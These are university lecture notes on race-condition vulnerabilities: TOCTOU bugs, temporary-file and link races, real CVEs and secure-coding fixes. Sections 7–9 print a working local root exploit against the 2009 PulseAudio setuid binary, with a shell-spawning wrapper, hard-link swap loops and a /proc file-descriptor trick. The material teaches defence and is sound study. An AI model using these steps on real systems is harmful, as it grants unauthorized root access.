<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>Race Conditions</title>
<!-- 2018-10-31 Wed 12:58 -->
<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta  name="generator" content="Org-mode" />
<meta  name="author" content="Prabhaker Mateti" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center; }
  .todo   { font-family: monospace; color: red; }
  .done   { color: green; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  pre.src-sh:before    { content: 'sh'; }
  pre.src-bash:before  { content: 'sh'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-R:before     { content: 'R'; }
  pre.src-perl:before  { content: 'Perl'; }
  pre.src-java:before  { content: 'Java'; }
  pre.src-sql:before   { content: 'SQL'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.right  { text-align: center;  }
  th.left   { text-align: center;   }
  th.center { text-align: center; }
  td.right  { text-align: right;  }
  td.left   { text-align: left;   }
  td.center { text-align: center; }
  dt { font-weight: bold; }
  .footpara:nth-child(2) { display: inline; }
  .footpara { display: block; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  /*]]>*/-->
</style>
<style> P,li {text-align: justify} code {color: brown;} @media screen {BODY {margin: 10%} }</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2013 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
</head>
<body>
<div id="org-div-home-and-up">
 <a accesskey="h" href="../"> UP </a>
 |
 <a accesskey="H" href="../../Top/index.html"> HOME </a>
</div><div id="preamble" class="status">
<a href="../../"> ../../</a> | <a href=./>NoSlides</a>
</div>
<div id="content">
<h1 class="title">Race Conditions</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">1. Abstract</a></li>
<li><a href="#sec-2">2. Objectives</a></li>
<li><a href="#sec-3">3. Race Conditions</a></li>
<li><a href="#sec-4">4. Real Life Examples</a>
<ul>
<li><a href="#sec-4-1">4.1. Real Life Example: PulseAudio 2009</a></li>
<li><a href="#sec-4-2">4.2. Real Life Example: Internet Explorer 2011</a></li>
<li><a href="#sec-4-3">4.3. Real Life Example: Firefox 2007</a></li>
<li><a href="#sec-4-4">4.4. Real Life Example: Windows Shortcut-Link 2010</a></li>
</ul>
</li>
<li><a href="#sec-5">5. Race Triggering Techniques</a>
<ul>
<li><a href="#sec-5-1">5.1. Time of Check/Time of Use (TOCTOU)</a></li>
<li><a href="#sec-5-2">5.2. Links Soft or Hard</a></li>
<li><a href="#sec-5-3">5.3. Temporary Files</a></li>
<li><a href="#sec-5-4">5.4. Threads and Processes</a></li>
<li><a href="#sec-5-5">5.5. Signals</a></li>
<li><a href="#sec-5-6">5.6. iNotify</a></li>
<li><a href="#sec-5-7">5.7. Shared Variables</a></li>
</ul>
</li>
<li><a href="#sec-6">6. Detection</a></li>
<li><a href="#sec-7">7. PulseAudio 2009 Exploit Further Explained</a></li>
<li><a href="#sec-8">8. Example Exploit 1: Classic Race Exploitation</a></li>
<li><a href="#sec-9">9. Example  Exploit 2: Use /proc File Descriptors</a></li>
<li><a href="#sec-10">10. Acknowledgements</a></li>
<li><a href="#sec-11">11. References</a>
<ul>
<li><a href="#sec-11-1">11.1. References</a></li>
<li><a href="#sec-11-2">11.2. References</a></li>
</ul>
</li>
<li><a href="#sec-12">12. End</a></li>
</ul>
</div>
</div>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><span class="section-number-2">1</span> Abstract</h2>
<div class="outline-text-2" id="text-1">
<p>
Abstract: Race condition exploits are due to sloppy software
  development, perhaps taking second rank only to buffer overflow
  exploits.  This lecture explains the race conditions and their
  exploits, and presents a few techniques that help in
  avoiding the exploit.
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><span class="section-number-2">2</span> Objectives</h2>
<div class="outline-text-2" id="text-2">
<p>
&lt;ol&gt;
</p>
<ol class="org-ol">
<li>Present a few real life examples of race condition exploits.
</li>
<li>Describe the exploit technique
</li>
<li>Describe several techniques of exploit avoidance.
</li>
</ol>
<p>
&lt;/ol&gt;
</p>
</div>
</div>


<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3"><span class="section-number-2">3</span> Race Conditions</h2>
<div class="outline-text-2" id="text-3">
<ol class="org-ol">
<li>"Time of check to time of use (TOCTOU) is a class of software bug
caused by changes in a system between the checking of a condition
(such as a security credential) and the use of the results of that
check. This is one example of a race condition."
</li>

<li>"Temporary file race vulnerabilities occur when privileged programs
attempt to create temporary files in an unsafe manner.  Unsafe
means non-atomic with respect to an attacker's activities.  There
is no portable standard for safely/ atomically creating temporary
files, and many OS have no safe temporary file creation at all."
</li>

<li>Race-Guard is a kernel enhancement that detects attempts to exploit
temporary file race vulnerabilities, and does so with sufficient
speed and precision that the attack can be halted before it takes
effect.
</li>

<li>RaceGuard [Cowan et al. 2002] is a secure kernel modification which
aims to prevent the temporary file creation race condition
exploits. It detects the pertinent changes in the file system
between the time an application probes for a nominated temporary
file name and the time the file is created. In a RaceGuard kernel,
each process keeps a cache of potential temporary file races. This
cache is just a list of file names associated with the process
descriptor. If the process probes for a file and it is
non-existent, the process cache is updated with the name of the
file. If file creation hits a file that already exists, and the
name matches a name in RaceGuard cache, then it is regarded as a
race attack and so the open system call aborts. If the file
creation succeeds without conflicts, then it is cleared from the
cache. Note that RaceGuard cannot defend against the file swap type
of attacks.
</li>

<li>Race conditions arise from multiple processes/threads that operate
on related entities in an OS that has preemptive scheduling.  Any
good OS book will describe race conditions.  The effects are often
an unexpected result in a computation, a deadlock, or a livelock.
</li>

<li>Within user processes, almost all race conditions reduce to races
in the file system.  Within OS kernels, race conditions are present
in various places, e.g., in virtual memory management code.
</li>

<li>Exploits based on race conditions are subtle.  They typically
require repeated attempts within the short time period.  These
exploits can be eliminated by understanding the ideas and
techniques of atomicity and mutual exclusion from concurrent
programming courses.  To keep up performance, the race condition
eliminations have to be done after deep analyses.  Real systems
continue to suffer from race conditions because of sloppy design
and construction.
</li>
</ol>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4"><span class="section-number-2">4</span> Real Life Examples</h2>
<div class="outline-text-2" id="text-4">
</div><div id="outline-container-sec-4-1" class="outline-3">
<h3 id="sec-4-1"><span class="section-number-3">4.1</span> Real Life Example: PulseAudio 2009</h3>
<div class="outline-text-3" id="text-4-1">
<p>
&lt;a href="<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894</a>"&gt;
CVE-2009-1894: "Race condition in PulseAudio 0.9.9, 0.9.10, and
0.9.14 allows local users to gain privileges via vectors involving
creation of a hard link, related to the application setting
LD<sub>BIND</sub><sub>NOW</sub> to 1, and then calling execv on the target of the
/proc/self/exe symlink."
</p>


<p>
This exploit is further explained &lt;a href="#PulseAudio2009"&gt;
later.
</p>
</div>
</div>


<div id="outline-container-sec-4-2" class="outline-3">
<h3 id="sec-4-2"><span class="section-number-3">4.2</span> Real Life Example: Internet Explorer 2011</h3>
<div class="outline-text-3" id="text-4-2">
<p>
&lt;a href="<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1257">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1257</a>"&gt;
CVE-2011-1257: "Race condition in Microsoft Internet Explorer 6
through 8 allows remote attackers to execute arbitrary code or cause a
denial of service (memory corruption) via vectors involving access to
an object, aka 'Window Open Race Condition Vulnerability.' "
</p>



<p>
This vulnerability was discovered in Jan 2011 and a patch was released
and publicly disclosed in August 2011.  An attacker composes a web
page with malicious code and when a user visits this page, the exploit
happens.
</p>
</div>
</div>

<div id="outline-container-sec-4-3" class="outline-3">
<h3 id="sec-4-3"><span class="section-number-3">4.3</span> Real Life Example: Firefox 2007</h3>
<div class="outline-text-3" id="text-4-3">
<p>
&lt;a href="<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5960">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5960</a>"&gt;
CVE-2007-5960: "Mozilla Firefox before 2.0.0.10 and SeaMonkey before
1.1.7 sets the Referer header to the window or frame in which script
is running, instead of the address of the content that initiated the
script, which allows remote attackers to spoof HTTP Referer headers
and bypass Referer-based CSRF protection schemes by setting
<code>window.location</code> and using a modal alert dialog that causes the wrong
Referer to be sent."
</p>



<p>
"&#x2026; it was possible to generate a fake HTTP Referer header by
exploiting a timing condition when setting the window.location
property. This could be used to conduct a Cross-Site Request Forgery
(CSRF) attack against websites that rely only on the Referer header as
protection against such attacks."
</p>



<p>
"When navigation occurs due to setting window.location, the Referer
header is supposed to reflect the address of the content which
initiated the script.  Instead, the referer was set to the address of
the window (or frame) in which the script was running, and this
vulnerability arises from that tiny difference. Using a modal alert()
dialog Fleischer was able to suspend the attack script so that it did
not load the target URI until after the attacker's initial content had
been replaced by the intended referring page. When the Referer is set
to the current URI of the script's window it is no longer the correct
one."
</p>
</div>
</div>

<div id="outline-container-sec-4-4" class="outline-3">
<h3 id="sec-4-4"><span class="section-number-3">4.4</span> Real Life Example: Windows Shortcut-Link 2010</h3>
<div class="outline-text-3" id="text-4-4">
<p>
&lt;a href="<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2568">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2568</a>"&gt;
CVE-2010-2568: "Windows Shell in Microsoft Windows XP SP3, Server
2003 SP2, Vista SP1 and SP2, Server 2008 SP2 and R2, and Windows 7
allows local users or remote attackers to execute arbitrary code via a
crafted (1) .LNK or (2) .PIF shortcut file, which is not properly
handled during icon display in Windows Explorer, as demonstrated in
the wild in July 2010, and originally reported for malware that
leverages CVE-2010-2772 in Siemens WinCC SCADA systems."
</p>


<p>
Summary of the exploit code at <a href="http://www.exploit-db.com/">http://www.exploit-db.com/</a>: "The .lnk
exploitation suffers from a race condition as it executes the
downloaded dll 3 times simultaneously.  This hinders the proper
exploitation of the victim in case the payload dll tries to write any
file on the disk or tries to access and change any other resource on
the victim system.  First thing to be noted that the .lnk exploit is
actually an undocumented DLL-Injection technique.  The .lnk file will
retrieve a file of type either .dll, .cpl or .ocx or extension which
are legitimate dynamic libraries with DllMain() defined."
</p>
</div>
</div>
</div>


<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5"><span class="section-number-2">5</span> Race Triggering Techniques</h2>
<div class="outline-text-2" id="text-5">
</div><div id="outline-container-sec-5-1" class="outline-3">
<h3 id="sec-5-1"><span class="section-number-3">5.1</span> Time of Check/Time of Use (TOCTOU)</h3>
<div class="outline-text-3" id="text-5-1">
<p>
This section describes certain coding practices that introduce
races, and their remedies.  In all the code examples, error checks
are not shown.
</p>

<p>
An exploit that has happened enough times since the 1980s is called
the "Time of Check/Time of Use (TOCTOU)" attack: Suppose process A
checked that a certain file exists and has certain attributes before
locking the file and opening the file.  By the time A opens it, the
file could have been replaced with another.  If the time gap between
TOC and TOU is long (remember even a lowly PC can do 10 MIPS),
developing an exploit is easy.  Clever exploits work even when the gap
is short.  In modern OS on multicore CPUs, this situation has worsened
because of threads.  These are implemented as memory-sharing extremely
lightweight versions of processes.
</p>


<p>
The following elaborates the above specific example, using file
system operations, of the general pattern of TOCTOU vulnerability.
</p>

<div class="org-src-container">

<pre class="src src-cpp">int access(const char *pathname, int mode);
FILE *fopen(const char *pathname, const char *mode);

...
char pnm[] = "some/path/name";
...

if (access(pnm, W_OK) == 0) {
  f = fopen(pnm, "w+");
  ...
}
else 
  fprintf(stderr,"You do not seem to have write access to %s.\n", pnm);
</pre>
</div>


<p>
Recall that access() checks whether the calling process can access
the file named by pathname.  If pathname is a symbolic link, it is
dereferenced.  The check is done using the calling process's real UID
and GID, rather than the effective IDs as is done when actually
attempting an operation (e.g., open(2)) on the file.  This allows
Set-User-ID programs to determine the invoking user's privileges.
</p>


<p>
However, a process/thread switch, caused by OS scheduling policies,
may have happened after access() check but before fopen().  By the
time the fopen() is performed by the iniating process in the next
line, three things could have happened: (i) contents of the pnm[] may
have changed, (ii) the permissions/content of the file referenced may
have changed, and (iii) if the path specified was a (sym)link, the
(sym)link may have changed.  Note that (iii) is a more blatant version
of (ii).  This exploit is further explained &lt;a href="#PulseAudio2009"&gt;
later.
</p>
</div>
</div>

<div id="outline-container-sec-5-2" class="outline-3">
<h3 id="sec-5-2"><span class="section-number-3">5.2</span> Links Soft or Hard</h3>
<div class="outline-text-3" id="text-5-2">
<p>
The following example is adapted
from &lt;a href="<a href="https://www.securecoding.cert.org/">https://www.securecoding.cert.org/</a>"&gt;
<a href="https://www.securecoding.cert.org/">https://www.securecoding.cert.org/</a>.
</p>



<p>
Recall that the POSIX lstat()= function collects information about
a symbolic link rather than its target, in contrast to stat()=.
The open() function does follow symbolic links and includes a check on
deep links.  We check the st<sub>mode</sub> field to determine if the given file
name is a symbolic link, and then open it if not so.
</p>

<div class="org-src-container">

<pre class="src src-cpp">char *pathname = ...;
char userbuf[] = ...;
... 
struct stat statOne;
... 
if ((lstat(pathname, &amp;statOne) == 0) &amp;&amp; !S_ISLNK(statOne.st_mode)) {
   int fd = open(pathname, O_RDWR), nb;
   ...
   nb = write(fd, userbuf, sizeof(userbuf));
   ...
}
</pre>
</div>



<p>
This code contains a TOCTOU race condition because both lstat and
open operate on a path name that can be manipulated asynchronously by
other processes.  We can check if an exploit happened by calling
fstat() on the file descriptor returned by open(), and comparing the
file information returned by the calls to lstat() and fstat() to
ensure that the files are the same.
</p>

<div class="org-src-container">

<pre class="src src-cpp">char *pathname = ...;
char userbuf[] = ...;
... 
struct stat statOne, statTwo;
... 
if ((lstat(pathname, &amp;statOne) == 0) &amp;&amp; !S_ISLNK(statOne.st_mode)) {
   int fd = open(pathname, O_RDWR), nb;
   int rx = fstat(fd, &amp;statTwo);
   if ( statOne.st_mode == statTwo.st_mode
   &amp;&amp;   statOne.st_ino  == statTwo.st_ino
   &amp;&amp;   statOne.st_dev  == statTwo.st_dev ) {
     /* no switcheroo occurred */
     ...
     nb = write(fd, userbuf, sizeof(userbuf));
     ...
  }
}
</pre>
</div>


<p>
This code eliminates the exploit condition because fstat() is
applied to file descriptors.  Comparing i-nodes, using the st<sub>ino</sub>
fields, modes, and devices, using the st<sub>dev</sub> fields, ensures that the
file passed to lstat() is the same as the file passed to fstat().
</p>


<p>
We should always: (i) Check for the existence of links when dealing
with files; (ii) Canonicalize path names before validation.  Absolute
or relative path names may contain file links such as symbolic (soft)
links, hard links, short cuts, shadows, aliases, and junctions. These
file links must be fully resolved before any file validation
operations are performed.
</p>
</div>
</div>

<div id="outline-container-sec-5-3" class="outline-3">
<h3 id="sec-5-3"><span class="section-number-3">5.3</span> Temporary Files</h3>
<div class="outline-text-3" id="text-5-3">
<p>
All OS have directories that permit the creation of files within by
arbitrary processes.  On Linux, we have <code>/tmp/</code> and
<code>/var/tmp/</code>.  These have been fertile grounds for race
condition exploits.  Often an application computes updates to its
persistent database in a temporary file and then applies the updates.
Using race condition exploits, a file swap can be made.
</p>



<p>
On a system that needs to be secure, the /tmp and /var/tmp should
be separate partitions mounted with nosuid and noexec options.  In
general: Create temporary files securely.  Remove temporary files
before termination of the process.  Do not create temporary files in
shared directories.
</p>
</div>
</div>

<div id="outline-container-sec-5-4" class="outline-3">
<h3 id="sec-5-4"><span class="section-number-3">5.4</span> Threads and Processes</h3>
<div class="outline-text-3" id="text-5-4">
<p>
When forking a process, file descriptors are copied to the child
process which can result in concurrent operations on the file.  This
can cause data to be read or written in a non-deterministic order,
creating race conditions and unpredictable behavior.  We should close
the file descriptor in the child after forking and then reopen it,
ensuring that the file has not been modified in the meantime.
</p>


<p>
Do not use threads that can be canceled asynchronously.
</p>
</div>
</div>


<div id="outline-container-sec-5-5" class="outline-3">
<h3 id="sec-5-5"><span class="section-number-3">5.5</span> Signals</h3>
<div class="outline-text-3" id="text-5-5">
<p>
Avoid using signals to implement normal functionality.  Do not use
signals to terminate threads.  Do not send an uncaught signal to kill
a thread because the signal kills the entire process, not just the
individual thread.
</p>
</div>
</div>

<div id="outline-container-sec-5-6" class="outline-3">
<h3 id="sec-5-6"><span class="section-number-3">5.6</span> iNotify</h3>
<div class="outline-text-3" id="text-5-6">
<p>
The iNotify framework on Linux registers your notification hooks.
These are called when a certain event happens (e.g. creating a target
file).  There is multi-core concurrency, and the target process can
run on a different CPU-core than the exploitation process which
no longer relies on OS scheduler to switch the target at the right
moment.
</p>
</div>
</div>

<div id="outline-container-sec-5-7" class="outline-3">
<h3 id="sec-5-7"><span class="section-number-3">5.7</span> Shared Variables</h3>
<div class="outline-text-3" id="text-5-7">
<p>
Ensure that compound operations on shared variables are atomic.
Expressions that include postfix or prefix increment (++), postfix or
prefix decrement (&#x2013;), or compound assignment operators always result
in compound operations. Compound assignment expressions use operators
such as *=, /=, %=, +=, -=, <a id="" name=""></a>=, &gt;&gt;&gt;=, ^= and |=.
</p>
</div>
</div>
</div>



<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6"><span class="section-number-2">6</span> Detection</h2>
<div class="outline-text-2" id="text-6">
<p>
The general solution to race conditions is to use a locking
mechanism to prevent one process from changing a variable until
another is finished with it.
"Black box methods may be able to identify evidence of race conditions
via methods such as multiple simultaneous connections, which may cause
the software to become instable or crash.  However, race conditions
with very narrow timing windows would not be detectable.  White Box
Common idioms are detectable in white box analysis, such as TOCTOU
file operations (CWE-367), or double-checked locking (CWE-609).  Race
conditions may be detected with a stress-test by calling the software
simultaneously from a large number of threads or processes, and look
for evidence of any unexpected behavior.  Insert breakpoints or delays
in between relevant code statements to artificially expand the race
window so that it will be easier to detect."
</p>


<p>
Elimination of race conditions is near impossible because the
TOCTOU pattern is necessary in many programs.  However, we can
make exploits based on races more difficult by adding more race
conditions.  To compromise the security of the program, attackers need
to win all these race conditions.
</p>
</div>
</div>

<div id="outline-container-sec-7" class="outline-2">
<h2 id="sec-7"><span class="section-number-2">7</span> PulseAudio 2009 Exploit Further Explained</h2>
<div class="outline-text-2" id="text-7">
<p>
On Linux, PulseAudio is a network-enabled sound server.  In 2009, its
binary was installed setuid root, and did not drop privileges before
re-executing itself.  A user who has write access to any directory on
the file system containing /usr/bin can exploit the race condition
vulnerability to execute arbitrary code with root privileges.  The
immediate workaround is to ensure that the file system holding
/usr/bin does not contain directories that are writable for
unprivileged users.  This example is further explained below [from
<a href="http://blog.stalkr.net">http://blog.stalkr.net</a>].  Note also that recent (2011+) Linux kernels
no longer permit hard links to suid-root executables.
</p>



<p>
The Pulseaudio exploit is an instance of TOCTOU.  It can be reduced
to the code shown below; let us call it vulnerable.c.
</p>

<div class="org-src-container">

<pre class="src src-cpp">#include &lt;stdio.h&gt;

char buf[4096], * args[] = { buf, "dummyArg", 0 };

int main(int argc, char *argv[], char **envp)
{
  if (argc &lt; 2) {
    readlink("/proc/self/exe", buf, sizeof(buf));
    usleep(1000);
    execve(args[0], args, 0);
  }
  printf("argc %d\n", argc);
  return 0;
}
</pre>
</div>

<p>
To experience the PulseAudio race reliably, we need to find a way to
stop the execution of the process before its main().
</p>
</div>
</div>

<div id="outline-container-sec-8" class="outline-2">
<h2 id="sec-8"><span class="section-number-2">8</span> Example Exploit 1: Classic Race Exploitation</h2>
<div class="outline-text-2" id="text-8">
<p>
Here is a wrapper.c to give us a shell with euid (geteuid) as uid
(setuid).  We now open two terminals.
</p>

<div class="org-src-container">

<pre class="src src-c">#include &lt; stdio.h&gt;
char *args[] = { "/bin/bash", 0 };
int main()
{
  int i = 0, j = geteuid();
  if (j == 0) {
    setuid(0);
    i = execv(args[0], args);
  }
  printf("euid %d i %d\n", j, i);
  return i;
}
</pre>
</div>


<p>
In the first terminal, prepare to trigger the
race condition by creating a hard (or soft) link to the vulnerable
program, then place our program (proof-of-concept poc) under the same
filename, and loop.
</p>

<div class="org-src-container">

<pre class="src src-bash">while :; do ln -f ./vulnerable poc; ln -f ./wrapper poc; done
</pre>
</div>


<p>
In the second terminal, just run the hardlink. We lower the
priority of the process to increase our chances for the race condition
to be triggered.
#+begin<sub>src</sub> cpp
 class="brush: bash"&gt;while :; do nice -n 20 ./poc; done
#+end<sub>src</sub> We
wait and the shell should appear &#x2026;, but it can take a long
time.
</p>
</div>
</div>


<div id="outline-container-sec-9" class="outline-2">
<h2 id="sec-9"><span class="section-number-2">9</span> Example  Exploit 2: Use /proc File Descriptors</h2>
<div class="outline-text-2" id="text-9">
<p>
Create the hardlink, then open a file descriptor in the current shell to it:
</p>
<div class="org-src-container">

<pre class="src src-bash">$ ln vulnerable poc
$ exec 3&lt; ./poc
$ ls -l /proc/$$/fd/3
lr-x------ 1 stalkr stalkr 64 Nov  1 03:39 /proc/2074/fd/3 -&gt; /home/stalkr/poc
</pre>
</div>


<p>
It is important to realize that at this point the program has not
been started, we just have a file descriptor to the program, and a
file descriptor has all information about owner and setuid bit.
</p>

<p>
Now we delete our hardlink to the setuid program:
<code>$ rm -f poc</code>
</p>


<p>
Now if you check the file descriptor, it should have appended to its destination " (deleted)" and the link is broken:
</p>
<div class="org-src-container">

<pre class="src src-cpp">$ ls -l /proc/$$/fd/3
lr-x------ 1 stalkr stalkr 64 Nov  1 03:39 /proc/2074/fd/3 -&gt; /home/stalkr/poc (deleted)
</pre>
</div>

<p>
On some kernels it does not change the destination, you just see
that the link is broken if you enable ls colors (green ok, red
broken).
</p>

<p>
Then just place the program you want at this destination. Here I will just use a setuid(geteuid)+execve(/bin/sh) wrapper.
=$ mv wrapper 'poc (deleted)'= On kernels where the fd symlink
has not changed its destination, you just have to rename it to poc.
</p>


<p>
The final step is to execute the program. We do that by using shell
built-in exec on the file descriptor and it has the effect of calling
execve() on this file descriptor. But remember, this file descriptor
has root owner and setuid bit, so it executes the vulnerable program
(still on disk because it was a hardlink) with these properties. The
vulnerable program then executes itself via /proc/self/exe which now
points to our program, and we eventually get the euid root:
</p>
<div class="org-src-container">

<pre class="src src-cpp">$ exec /proc/$$/fd/3
sh-4.1# id
uid=0(root) gid=1000(stalkr) groups=0(root),1000(stalkr)
</pre>
</div>
<p>
Race won in one shot!
</p>


<p>
Update: on newer (&gt; 2010) kernels, this exploitation technique is no
longer usable because file is renamed as (deleted) /path/to/file.
</p>
</div>
</div>





<div id="outline-container-sec-10" class="outline-2">
<h2 id="sec-10"><span class="section-number-2">10</span> Acknowledgements</h2>
<div class="outline-text-2" id="text-10">
<p>
These lecture materials are gleaned from many sources. All are
presented after careful reading. In some cases, I may have neglected
proper attribution. I assure the reader it is not because I claim
authorship. Indeed, in the lectures there is hardly any thing new that
I have contributed. Suggestions for improvement are always welcome.
</p>
</div>
</div>


<div id="outline-container-sec-11" class="outline-2">
<h2 id="sec-11"><span class="section-number-2">11</span> References</h2>
<div class="outline-text-2" id="text-11">
<ol class="org-ol">
<li>Apple.com,
&lt;a href="<a href="http://developer.apple.com/library/mac/#documentation/Security/Conceptual/SecureCodingGuide/">http://developer.apple.com/library/mac/#documentation/Security/Conceptual/SecureCodingGuide/</a>"&gt; Secure Coding Guide, 2012.  Reference.
</li>
</ol>


<ol class="org-ol">
<li>    &lt;a href="<a href="http://cwe.mitre.org/">http://cwe.mitre.org/</a>"&gt; Mitre.org, CWE-362: Concurrent
Execution using Shared Resource with Improper Synchronization ('Race
Condition').  Required Visit.
</li>

<li>    Drepper, Ulrich. Defensive Programming for Red Hat Enterprise
Linux (and What To Do If Something Goes Wrong), May 3, 2006.
No, not just for RedHat.  Recommended Reading.
</li>
</ol>


<ol class="org-ol">
<li>    Mark G. Graff and Kenneth R. van Wyk,
Secure Coding: Principles &amp; Practices (book),
O'Reilly.com, 
&lt;a href="<a href="http://www.securecoding.org/">http://www.securecoding.org/</a>"&gt;
<a href="http://www.securecoding.org/">http://www.securecoding.org/</a>, 2003.  Reference.
</li>

<li>    Eugene Tsyrklevich and Bennet Yee, "Dynamic Detection and
Prevention of Race Conditions in File Accesses", 
12th USENIX Security Symposium, August 2003.  Recommended Reading.
</li>

<li>Race conditions in signal<sub>handlers</sub>: 
(i) <a href="https://www.owasp.org/">https://www.owasp.org/</a> index.php/ Race_ condition_ in_ signal_ handler,
(ii) <a href="http://lcamtuf.coredump.cx/">http://lcamtuf.coredump.cx/</a> signals.txt.   Recommended Reading.
</li>
</ol>


<ol class="org-ol">
<li>David A. Wheeler, Secure Programming for Linux and Unix HOWTO
&#x2013; Creating Secure Software (free book)
&lt;a href="<a href="http://www.dwheeler.com/secure-programs/">http://www.dwheeler.com/secure-programs/</a>"&gt;
  <a href="http://www.dwheeler.com/">http://www.dwheeler.com/</a> secure-programs/ Section on Avoid Race
Conditions: Required Reading.
</li>

<li>      Michal Zalewski, Browser Security Handbook, 2009.
&lt;a href="<a href="http://code.google.com/p/browsersec/wiki/Main">http://code.google.com/p/browsersec/wiki/Main</a>"&gt; <a href="http://code.google.com/p/browsersec/">http://code.google.com/p/browsersec/</a> wiki/Main  Reference.
</li>

<li>      David A. Wheeler, Prevent race conditions, "<a href="http://www.ibm.com/developerworks/linux/library/l-sprace/index.html">http://www.ibm.com/developerworks/linux/library/l-sprace/index.html</a> 2004. Required Reading.
</li>
</ol>
</div>

<div id="outline-container-sec-11-1" class="outline-3">
<h3 id="sec-11-1"><span class="section-number-3">11.1</span> References</h3>
<div class="outline-text-3" id="text-11-1">
<ol class="org-ol">
<li>Crispin Cowan,
<a href="https://www2.seas.gwu.edu/~simhaweb/security/spring2009/papers/Cowan.pdf">https://www2.seas.gwu.edu/~simhaweb/security/spring2009/papers/Cowan.pdf</a>,
Software Security for Open-Source Systems, 2009, Recommended Reading
<a href="https://www.researchgate.net/publication/2852243_RaceGuard_Kernel_Protection_from_Temporary_File_Race_Vulnerabilities">https://www.researchgate.net/publication/2852243_RaceGuard_Kernel_Protection_from_Temporary_File_Race_Vulnerabilities</a>
2002 <a href="https://slideplayer.com/slide/8541919/">https://slideplayer.com/slide/8541919/</a> 18 Slides.  Reference
</li>

<li>Dirty COW:: "A race condition was found in the way the Linux
kernel's memory subsystem handled the copy-on-write (COW) breakage
of private read-only memory mappings.  An unprivileged local user
could use this flaw to gain write access to otherwise read-only
memory mappings and thus increase their privileges on the system."
</li>
</ol>
</div>
</div>

<div id="outline-container-sec-11-2" class="outline-3">
<h3 id="sec-11-2"><span class="section-number-3">11.2</span> References</h3>
<div class="outline-text-3" id="text-11-2">
<ol class="org-ol">
<li><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails">https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</a>
The bug has existed since around 2.6.22 (released in 2007) and was
fixed on Oct 18, 2016. Reference.
</li>

<li>Matt Bishop, <a href="./UCDavisTR95-RaceConditionFlaw.pdf">./UCDavisTR95-RaceConditionFlaw.pdf</a>
</li>

